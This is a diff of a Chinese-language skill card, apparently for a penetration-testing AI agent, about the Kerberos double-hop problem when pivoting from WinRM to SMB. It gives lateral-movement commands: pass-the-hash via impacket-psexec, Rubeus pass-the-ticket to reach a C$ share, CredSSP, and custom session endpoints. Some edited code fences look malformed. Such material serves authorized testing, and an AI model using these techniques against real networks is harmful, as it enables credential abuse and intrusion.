@@ -4,7 +4,7 @@ description: 'Kerberos双跳问题：WinRM→SMB失败原因+CredSSP/PTH/PSSessi
 disable-model-invocation: true
 metadata: { domain: ad-win, tier: T3 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。
 
 ## Kerberos 双跳问题
 
@@ -20,9 +20,10 @@ Kerberos 票据默认不可委派。第一次跳（Kali → WinRM ServerA）的 
 ```powershell
 # 在目标 ServerA 上启用 CredSSP
 Enable-WSManCredSSP -Role Server -Force
-# Kali 端
-evil-winrm -i ServerA -u user -p pass -- credssp
-```
+# 从 Windows 客户端(需已启用 Client 角色)连接:
+Enter-PSSession -ComputerName ServerA -Authentication Credssp -Credential $cred
+# 注意: evil-winrm 不支持 CredSSP；Kali 上优先走 B 方案的 PTT
+```text
 
 #### B: PTH / PTT 跳过双跳
 ```bash
@@ -31,13 +32,13 @@ impacket-psexec -hashes :<NTLM> domain/user@ServerB
 # 或者
 Rubeus.exe asktgt /user:user /rc4:<NTLM> /ptt  # 先拿 TGT
 dir \\ServerB\C$                                     # 再 SMB
-```
+```text
 
 #### C: PSSessionConfiguration（注册自定义端点）
 ```powershell
 Register-PSSessionConfiguration -Name MyEndpoint -RunAsCredential (Get-Credential) -Force
 Enter-PSSession -ComputerName ServerB -ConfigurationName MyEndpoint
-```
+```text
 
 #### D: 委派（需要 AD 配置）
 - 约束委派: 配置 ServerA 的 `msDS-AllowedToDelegateTo` 指向 ServerB
@@ -48,4 +49,4 @@ Enter-PSSession -ComputerName ServerB -ConfigurationName MyEndpoint
 # WinRM → SMB 失败 → 检查是否有双跳
 whoami /groups | findstr "SeDelegateSessionUserImpersonatePrivilege"
 # 如果没有 → 双跳被阻
-```
+```text
